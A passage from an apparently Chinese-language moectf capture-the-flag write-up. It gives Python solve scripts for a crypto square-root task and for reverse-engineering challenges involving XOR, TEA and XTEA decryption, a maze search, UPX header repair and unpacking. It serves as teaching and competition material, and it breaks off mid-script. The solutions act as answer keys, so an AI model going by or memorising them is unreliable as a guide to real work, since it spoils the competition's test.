        <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">if</span> t == <span class="hljs-number">1</span>:
            <span class="hljs-keyword">return</span> r
        i = <span class="hljs-number">1</span>
        t2 = <span class="hljs-built_in">pow</span>(t, <span class="hljs-number">2</span>, pp)
        <span class="hljs-keyword">while</span> t2 != <span class="hljs-number">1</span>:
            t2 = <span class="hljs-built_in">pow</span>(t2, <span class="hljs-number">2</span>, pp)
            i += <span class="hljs-number">1</span>
        <span class="hljs-keyword">if</span> i == m:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        b = <span class="hljs-built_in">pow</span>(c, <span class="hljs-number">1</span> &lt;&lt; (m - i - <span class="hljs-number">1</span>), pp)
        m = i
        c = <span class="hljs-built_in">pow</span>(b, <span class="hljs-number">2</span>, pp)
        t = (t * c) % pp
        r = (r * b) % pp

<span class="hljs-comment">#求平方根</span>
sqrt_r = tonelli_shanks(text_sq, p_)
<span class="hljs-keyword">if</span> sqrt_r <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No square root found, error&quot;</span>)
    exit(<span class="hljs-number">1</span>)
r1 = sqrt_r
r2 = p_ - sqrt_r
candidates = [r1, r2]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_half</span>(<span class="hljs-params">current_text, lis_given</span>):
    current = <span class="hljs-built_in">bytearray</span>(current_text)
    <span class="hljs-keyword">for</span> round_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):
        bit_pos = <span class="hljs-number">9</span> - round_num
        enc_list = []
        multiple_positions = []
        has_multiple = <span class="hljs-literal">False</span>
        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
            <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
                k = row * <span class="hljs-number">4</span> + col
                y = current[k]
                pa = a[row][col]
                thresh = pa // <span class="hljs-number">2</span>
                bit = (lis_given[row][col] &gt;&gt; bit_pos) &amp; <span class="hljs-number">1</span>
                possible_x = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> reverse_a[pa][y] <span class="hljs-keyword">if</span> (x &gt; thresh) == (bit == <span class="hljs-number">1</span>)]
                possible_z = <span class="hljs-built_in">set</span>()
                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> possible_x:
                    possible_z.update(reverse_251[x])
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> possible_z:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
                possible_z = <span class="hljs-built_in">list</span>(possible_z)
                enc_list.append(possible_z)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(possible_z) &gt; <span class="hljs-number">1</span>:
                    has_multiple = <span class="hljs-literal">True</span>
                    multiple_positions.append((k, possible_z))
        
        <span class="hljs-keyword">if</span> has_multiple:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">else</span>:
            enc_bytes = <span class="hljs-built_in">bytearray</span>([lst[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> lst <span class="hljs-keyword">in</span> enc_list])
            prev = cipher.decrypt(enc_bytes)
            current = <span class="hljs-built_in">bytearray</span>(prev)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(current)

flag = <span class="hljs-literal">None</span>
<span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> candidates:
    full = long_to_bytes(r)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(full) &lt; <span class="hljs-number">32</span>:
        full = <span class="hljs-string">b&#x27;\\x00&#x27;</span> * (<span class="hljs-number">32</span> - <span class="hljs-built_in">len</span>(full)) + full
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(full) != <span class="hljs-number">32</span>:
        <span class="hljs-keyword">continue</span>
    text0 = full[:<span class="hljs-number">16</span>]
    text1 = full[<span class="hljs-number">16</span>:]
    flag0 = reverse_half(text0, lis0_given)
    <span class="hljs-keyword">if</span> flag0 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">continue</span>
    flag1 = reverse_half(text1, lis1_given)
    <span class="hljs-keyword">if</span> flag1 <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">continue</span>
    flag_candidate = flag0 + flag1
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{flag_candidate}</span>&quot;</span>)
</code></pre></div>
<h2 class="md-h md-h2" id="reverse"><span class="md-hash" aria-hidden="true">## </span><span class="md-h-text">reverse</span></h2>
<h3 class="md-h md-h3" id="speed"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">speed</span></h3>
<p>动态调试在creatwindow下断点，单步调试，flag在window上，照抄即可</p>
<h3 class="md-h md-h3" id="base"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">base</span></h3>
<p>标准base64，直接解码即可</p>
<h3 class="md-h md-h3" id="catch"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">catch</span></h3>
<p>nop掉exception即可</p>
<h3 class="md-h md-h3" id="upx"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">upx</span></h3>
<p>upx脱壳，简单异或加密，注意输入的最后是换行符，因此可以倒推：</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">17 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python">v6 = [
    <span class="hljs-number">35</span>, <span class="hljs-number">43</span>, <span class="hljs-number">39</span>, <span class="hljs-number">54</span>, <span class="hljs-number">51</span>, <span class="hljs-number">60</span>, <span class="hljs-number">3</span>, <span class="hljs-number">72</span>, <span class="hljs-number">100</span>, <span class="hljs-number">11</span>,
    <span class="hljs-number">29</span>, <span class="hljs-number">118</span>, <span class="hljs-number">123</span>, <span class="hljs-number">16</span>, <span class="hljs-number">11</span>, <span class="hljs-number">58</span>, <span class="hljs-number">63</span>, <span class="hljs-number">101</span>, <span class="hljs-number">118</span>, <span class="hljs-number">41</span>,
    <span class="hljs-number">21</span>, <span class="hljs-number">55</span>, <span class="hljs-number">28</span>, <span class="hljs-number">10</span>, <span class="hljs-number">8</span>, <span class="hljs-number">33</span>, <span class="hljs-number">62</span>, <span class="hljs-number">60</span>, <span class="hljs-number">61</span>, <span class="hljs-number">22</span>,
    <span class="hljs-number">11</span>, <span class="hljs-number">36</span>, <span class="hljs-number">41</span>, <span class="hljs-number">36</span>, <span class="hljs-number">86</span>
]

flag_chars = [<span class="hljs-number">0</span>] * <span class="hljs-number">35</span>
next_char = <span class="hljs-number">10</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):
    current_char = v6[i] ^ <span class="hljs-number">0x21</span> ^ next_char
    flag_chars[i] = current_char
    next_char = current_char
flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag_chars)
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag)
</code></pre></div>
<h3 class="md-h md-h3" id="ez3"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ez3</span></h3>
<p>本来爆破出来了一个，但是交上去不对，后来才发现有多解，于是把每个位置所有可能值都打印出来看看哪个符合flag格式</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">41 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cpp_srem</span>(<span class="hljs-params">a, n</span>):
    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> a
    rem = a % <span class="hljs-built_in">abs</span>(n)
    <span class="hljs-keyword">if</span> a &lt; <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> -rem
    <span class="hljs-keyword">return</span> rem

<span class="hljs-keyword">def</span> <span class="hljs-title function_">find_all_solutions</span>():
    a = [
        <span class="hljs-number">0xB1B0</span>, <span class="hljs-number">0x5678</span>, <span class="hljs-number">0x7FF2</span>, <span class="hljs-number">0xA332</span>, <span class="hljs-number">0xA0E8</span>, <span class="hljs-number">0x364C</span>, <span class="hljs-number">0x2BD4</span>, <span class="hljs-number">0xC8FE</span>,
        <span class="hljs-number">0x4A7C</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x2BE4</span>, <span class="hljs-number">0x4144</span>, <span class="hljs-number">0x3BA6</span>, <span class="hljs-number">0xBE8C</span>, <span class="hljs-number">0x8F7E</span>, <span class="hljs-number">0x35F8</span>,
        <span class="hljs-number">0x61AA</span>, <span class="hljs-number">0x2B4A</span>, <span class="hljs-number">0x6828</span>, <span class="hljs-number">0xB39E</span>, <span class="hljs-number">0xB542</span>, <span class="hljs-number">0x33EC</span>, <span class="hljs-number">0xC7D8</span>, <span class="hljs-number">0x448C</span>,
        <span class="hljs-number">0x9310</span>, <span class="hljs-number">0x8808</span>, <span class="hljs-number">0xADD4</span>, <span class="hljs-number">0x3CC2</span>, <span class="hljs-number">0x796</span>, <span class="hljs-number">0xC940</span>, <span class="hljs-number">0x4E32</span>, <span class="hljs-number">0x4E2E</span>,
        <span class="hljs-number">0x924A</span>, <span class="hljs-number">0x5B5C</span>
    ]

    all_options = [[] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>)]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>):
        b_prev = a[i - <span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> char_code <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):
            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:
                calc_val = <span class="hljs-number">47806</span> * char_code
            <span class="hljs-keyword">else</span>:
                calc_val = (<span class="hljs-number">47806</span> * (char_code + i)) ^ b_prev ^ <span class="hljs-number">0x114514</span>
            b_i = cpp_srem(calc_val, <span class="hljs-number">51966</span>)
            <span class="hljs-keyword">if</span> b_i == a[i]:
                all_options[i].append(<span class="hljs-built_in">chr</span>(char_code))
    flag = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i, options <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(all_options):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;位置 <span class="hljs-subst">{i:02d}</span>: <span class="hljs-subst">{options}</span>&quot;</span>)
        <span class="hljs-keyword">if</span> options:
            flag += options[<span class="hljs-number">0</span>]
        <span class="hljs-keyword">else</span>:
            flag += <span class="hljs-string">&quot;?&quot;</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;moectf{{<span class="hljs-subst">{flag}</span>}}&quot;</span>) <span class="hljs-comment">#这个是根据所有第一个候选值拼接出来的，不一定对</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    find_all_solutions()
</code></pre></div>
<h3 class="md-h md-h3" id="flower"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">flower</span></h3>
<p>只有一句需要处理的花指令，je，jne相当于必定跳转，于是下面导致静态分析出问题的jmp可以直接nop掉，之后分析算法，发现给的key解出来是乱码，猜测会修改key，由于key只有一字节，爆破即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">22 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">key</span>):
    enc = [
        <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x7E</span>,
        <span class="hljs-number">0x44</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x1A</span>,
        <span class="hljs-number">0x52</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2B</span>
    ]
    initial_key = key
    content_chars = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):
        current_key = initial_key + i
        encoded_value = enc[i]
        original_char_code = encoded_value ^ current_key
        content_chars.append(<span class="hljs-built_in">chr</span>(original_char_code))
    content = <span class="hljs-string">&quot;&quot;</span>.join(content_chars)
    flag = <span class="hljs-string">f&quot;moectf{{<span class="hljs-subst">{content}</span>}}&quot;</span>
    <span class="hljs-keyword">return</span> flag

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):
        flag = solve(i)
        <span class="hljs-built_in">print</span>(i,flag)
</code></pre></div>
<h3 class="md-h md-h3" id="a-cup-of-tea"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">A cup of tea</span></h3>
<p>tea加密</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">29 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> struct

<span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v, k</span>):
    v0, v1 = v
    delta = <span class="hljs-number">0x114514</span>
    s = delta * <span class="hljs-number">32</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):
        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>]) ^ (v0 + s) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>])) &amp; <span class="hljs-number">0xFFFFFFFF</span>
        v1 &amp;= <span class="hljs-number">0xFFFFFFFF</span>
        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>]) ^ (v1 + s) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>])) &amp; <span class="hljs-number">0xFFFFFFFF</span>
        v0 &amp;= <span class="hljs-number">0xFFFFFFFF</span>
        s -= delta
        s &amp;= <span class="hljs-number">0xFFFFFFFF</span>
    <span class="hljs-keyword">return</span> [v0, v1]

key = [<span class="hljs-number">289739801</span>, <span class="hljs-number">427884820</span>, <span class="hljs-number">1363251608</span>, <span class="hljs-number">269567252</span>]
cipher = [
    <span class="hljs-number">2026214571</span>, <span class="hljs-number">578894681</span>, <span class="hljs-number">1193947460</span>, 
    -<span class="hljs-number">229306230</span> &amp; <span class="hljs-number">0xFFFFFFFF</span>, <span class="hljs-number">73202484</span>, <span class="hljs-number">961145356</span>, 
    -<span class="hljs-number">881456792</span> &amp; <span class="hljs-number">0xFFFFFFFF</span>, <span class="hljs-number">358205817</span>, -<span class="hljs-number">554069347</span> &amp; <span class="hljs-number">0xFFFFFFFF</span>, 
    <span class="hljs-number">119347883</span>
]
cipher_blocks = [cipher[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">2</span>)]
decrypted_flag = <span class="hljs-string">b&quot;&quot;</span>
<span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> cipher_blocks:
    decrypted_block = decrypt(block, key)
    decrypted_flag += struct.pack(<span class="hljs-string">&#x27;&lt;LL&#x27;</span>, decrypted_block[<span class="hljs-number">0</span>], decrypted_block[<span class="hljs-number">1</span>])
<span class="hljs-built_in">print</span>(decrypted_flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip(<span class="hljs-string">&#x27;\\x00&#x27;</span>))
</code></pre></div>
<h3 class="md-h md-h3" id="ezpy"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ezpy</span></h3>
<p>丢给PyLingual，可得py源码：</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">20 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">caesar_cipher_encrypt</span>(<span class="hljs-params">text, shift</span>):
    result = []
    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> text:
        <span class="hljs-keyword">if</span> char.isalpha():
            <span class="hljs-keyword">if</span> char.islower():
                new_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))
            <span class="hljs-keyword">elif</span> char.isupper():
                new_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))
            result.append(new_char)
        <span class="hljs-keyword">else</span>:
            result.append(char)
    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(result)
user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your flag：&#x27;</span>)
a = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> a != <span class="hljs-number">1</span>:
    plaintext = user_input
    shift = <span class="hljs-number">114514</span>
    encrypted_text = caesar_cipher_encrypt(plaintext, shift)
    <span class="hljs-keyword">if</span> encrypted_text == <span class="hljs-string">&#x27;wyomdp{I0e_Ux0G_zim}&#x27;</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!!!!&#x27;</span>)</code></pre></div>
<p>凯撒密码，shift为114514，cyberchef一把梭</p>
<h3 class="md-h md-h3" id="mazegame"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">mazegame</span></h3>
<p>迷宫题，能直接提取字符串迷宫，bfs即可（所以为什么flag不对路径做一下哈希，也太长了吧）</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">92 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> collections

<span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():
    maze_data = [
        <span class="hljs-string">&quot;11111111111111111111111111111111111111111111111111111111&quot;</span>,
        <span class="hljs-string">&quot;10100000000000000010000011011101011111111101011100000111&quot;</span>,
        <span class="hljs-string">&quot;10111010111111111010111011000001000001000001000101110111&quot;</span>,
        <span class="hljs-string">&quot;10000010000010000010001011011111111101110111011101110111&quot;</span>,
        <span class="hljs-string">&quot;10111111111011101110111011010000000000010100010001110111&quot;</span>,
        <span class="hljs-string">&quot;10100000001000101000100011010101111111011101110101110111&quot;</span>,
        <span class="hljs-string">&quot;10101011111110111011101011010101000001000000010101110111&quot;</span>,
        <span class="hljs-string">&quot;10101010000010100000101011110101110101111101111111110111&quot;</span>,
        <span class="hljs-string">&quot;10111010111010101111101011100101000100000101000101110111&quot;</span>,
        <span class="hljs-string">&quot;10000010001010001000001011001111011111010101011101110111&quot;</span>,
        <span class="hljs-string">&quot;11111011101011111011111111101000100000101100101001110111&quot;</span>,
        <span class="hljs-string">&quot;10001010001000100010000010001010011000100010010011000001&quot;</span>,
        <span class="hljs-string">&quot;10111010111110101010111011011001011111010101011101011101&quot;</span>,
        <span class="hljs-string">&quot;10001010001000001010001011000101000100000101000101011101&quot;</span>,
        <span class="hljs-string">&quot;11101011101111111011101011110101110111111101110101011101&quot;</span>,
        <span class="hljs-string">&quot;10001000101000001010001011000100010100000101000101011101&quot;</span>,
        <span class="hljs-string">&quot;10111111101011101110111011011111110101110111011101011101&quot;</span>,
        <span class="hljs-string">&quot;10001000001000100000001011000100000100010000000101011001&quot;</span>,
        <span class="hljs-string">&quot;11101011111011111111101011110101111101111111110101011011&quot;</span>,
        <span class="hljs-string">&quot;10101000000010001000101011010100000001000100010101011011&quot;</span>,
        <span class="hljs-string">&quot;10101111111110101010101011010111111111010101010101011011&quot;</span>,
        <span class="hljs-string">&quot;10100000000000100010101011010000000000010001010101011011&quot;</span>,
        <span class="hljs-string">&quot;10111111111111111110111011011111111111111111011101011011&quot;</span>,
        <span class="hljs-string">&quot;10000000001111000000000011110111010000111100011111011011&quot;</span>,
        <span class="hljs-string">&quot;11101111100000011011011111111010110111011101100001011011&quot;</span>,
        <span class="hljs-string">&quot;11101111111111111011011111111101110111101101100001011011&quot;</span>,
        <span class="hljs-string">&quot;10001000111111000010000011111010110111011101100001011011&quot;</span>,
        <span class="hljs-string">&quot;10111010111111111010111011110111010000111101100001010011&quot;</span>,
        <span class="hljs-string">&quot;10000010000010000010001011111111111111111101100001010111&quot;</span>,
        <span class="hljs-string">&quot;10111111111011101110111011110001000110001101100001010001&quot;</span>,
        <span class="hljs-string">&quot;10100000001000101000100011110111011101111101100001011101&quot;</span>,
        <span class="hljs-string">&quot;10101011111110111011101011110001000101111101100001011101&quot;</span>,
        <span class="hljs-string">&quot;10101010000010100000101011111101011101111101100001011101&quot;</span>,
        <span class="hljs-string">&quot;10111010111010101111101011110001000110001101100001011101&quot;</span>,
        <span class="hljs-string">&quot;10000010001010101000001011111111111111111101100001011101&quot;</span>,
        <span class="hljs-string">&quot;11111011101011111011111110000000000000001101100001011101&quot;</span>,
        <span class="hljs-string">&quot;10001010001000100010000011111111111111111100110011011101&quot;</span>,
        <span class="hljs-string">&quot;10111010111110101010111010010000000011111110001111011101&quot;</span>,
        <span class="hljs-string">&quot;10001010001000001010001010110111000001111110100101011101&quot;</span>,
        <span class="hljs-string">&quot;11101011101111111011101000110011001111111100110111011101&quot;</span>,
        <span class="hljs-string">&quot;10001000101000001010001011111111111111111111110111010001&quot;</span>,
        <span class="hljs-string">&quot;10111111101011101110111010100001001100000000000011011011&quot;</span>,
        <span class="hljs-string">&quot;10001000001000100000001011111111111101011101111001011011&quot;</span>,
        <span class="hljs-string">&quot;10101011111011111111101011000000000001000100010111011011&quot;</span>,
        <span class="hljs-string">&quot;10101000000010001000101010010111111111111111111111011011&quot;</span>,
        <span class="hljs-string">&quot;10101111111110101010101010110111111111111111111101011011&quot;</span>,
        <span class="hljs-string">&quot;10100000000000100010101011100000000000000000000011011011&quot;</span>,
        <span class="hljs-string">&quot;10111111111111111110011011111111111111111111111011011011&quot;</span>,
        <span class="hljs-string">&quot;10000011111111111111000010000000000000000000000000011001&quot;</span>,
        <span class="hljs-string">&quot;11111011111111111111111111111111111111111111111111111101&quot;</span>,
        <span class="hljs-string">&quot;11111011100001100110110111000000000000000000000111111101&quot;</span>,
        <span class="hljs-string">&quot;11111011101111011010000111011111111111111111110111111101&quot;</span>,
        <span class="hljs-string">&quot;11111011100001000010110110000111111111111111110000000001&quot;</span>,
        <span class="hljs-string">&quot;11111011101111011010110111101111111111111111111111111111&quot;</span>,
        <span class="hljs-string">&quot;11110000000000011000110000000000000000000000000000000011&quot;</span>,
        <span class="hljs-string">&quot;11111111111111111111111111111111111111111111111111111111&quot;</span>,
    ]
    padded_maze = [row.ljust(<span class="hljs-number">56</span>, <span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> maze_data]
    start_pos = (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)   <span class="hljs-comment"># (y, x)</span>
    end_pos = (<span class="hljs-number">15</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># (y, x)</span>
    height = <span class="hljs-number">56</span>
    width = <span class="hljs-number">56</span>
    queue = collections.deque([(start_pos[<span class="hljs-number">0</span>], start_pos[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;&quot;</span>)])
    visited = {start_pos}

    <span class="hljs-keyword">while</span> queue:
        y, x, path = queue.popleft()
        <span class="hljs-keyword">if</span> (y, x) == end_pos:
            <span class="hljs-keyword">return</span> path
        moves = {
            <span class="hljs-string">&#x27;D&#x27;</span>: (y, x + <span class="hljs-number">1</span>),
            <span class="hljs-string">&#x27;S&#x27;</span>: (y + <span class="hljs-number">1</span>, x),
            <span class="hljs-string">&#x27;A&#x27;</span>: (y, x - <span class="hljs-number">1</span>),
            <span class="hljs-string">&#x27;W&#x27;</span>: (y - <span class="hljs-number">1</span>, x),
        }
        <span class="hljs-keyword">for</span> move_char, (next_y, next_x) <span class="hljs-keyword">in</span> moves.items():
            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= next_y &lt; height <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= next_x &lt; width:
                <span class="hljs-keyword">if</span> (next_y, next_x) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited <span class="hljs-keyword">and</span> padded_maze[next_y][next_x] == <span class="hljs-string">&#x27;0&#x27;</span>:
                    visited.add((next_y, next_x))
                    new_path = path + move_char
                    queue.append((next_y, next_x, new_path))
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;None&quot;</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    solution_path = solve()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;path：&quot;</span>)
    <span class="hljs-built_in">print</span>(solution_path)
</code></pre></div>
<h3 class="md-h md-h3" id="upx_revenge"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">upx_revenge</span></h3>
<p>附件中的1.exe打不开，用cff加载发现file size比pe size少了4byte，用ida打开发现start函数前面4个push被吞了，所以缺失的4字节在upx0区段前，观察upx头，有版本号<code class="md-code-inline">4.24</code>但是没有魔数<code class="md-code-inline">UPX!</code>，并且<code class="md-code-inline">4.24</code>后紧跟的<code class="md-code-inline">0D 24 02 08</code>是upx压缩方法，所以缺失的4字节正好是<code class="md-code-inline">UPX!</code>，插入<code class="md-code-inline">UPX!</code>保存，能成功<code class="md-code-inline">upx -d</code>，拖进ida，发现是base64+异或，直接解即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">10 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> base64

cipher = <span class="hljs-string">r&quot;lY7bW=\\ck?eyjX7]TZ\\}CVbh\\tOyTH6&gt;jH7XmFifG]H7&quot;</span>.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>)


b64_bytes = <span class="hljs-built_in">bytes</span>([b ^ <span class="hljs-number">0x0E</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> cipher])
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;b64 string:&quot;</span>, b64_bytes.decode(<span class="hljs-string">&#x27;latin1&#x27;</span>))
plain = base64.b64decode(b64_bytes)
<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bytes:&quot;</span>, plain)
</code></pre></div>
<h3 class="md-h md-h3" id="two-cups-of-tea"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">Two cups of tea</span></h3>
<p>xtea+xxtea</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">86 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> struct

<span class="hljs-keyword">def</span> <span class="hljs-title function_">U32</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> x &amp; <span class="hljs-number">0xFFFFFFFF</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">F</span>(<span class="hljs-params">param_A, param_B, sub_key, round_const</span>):
    term1 = U32((param_A &lt;&lt; <span class="hljs-number">4</span>) ^ (param_B &gt;&gt; <span class="hljs-number">3</span>))
    term2 = U32((param_A &gt;&gt; <span class="hljs-number">5</span>) ^ (param_B &lt;&lt; <span class="hljs-number">2</span>))
    term3 = U32(round_const ^ param_B)
